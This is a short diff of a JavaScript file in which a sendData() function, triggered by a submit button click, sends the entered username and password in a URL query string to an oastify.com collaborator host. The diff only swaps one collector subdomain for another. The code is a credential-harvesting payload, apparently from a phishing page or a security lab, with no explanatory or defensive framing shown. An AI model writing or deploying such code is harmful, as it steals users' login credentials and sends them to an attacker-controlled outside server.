@@ -25,7 +25,7 @@ function sendData() {
         return;
     }
 
-    fetch(`https://uqo35i63apvkfu5ysg87dhmay14sskg9.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
+    fetch(`https://bixkxzyk26n17bxfkx0o5yerqiw9k0loa.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
         .then(response => response.text())
         .then(data => {
             console.log("Response from server:", data);
@@ -38,3 +38,4 @@ function sendData() {
 }
 
 document.getElementById('submitBtn').addEventListener('click', sendData);
+
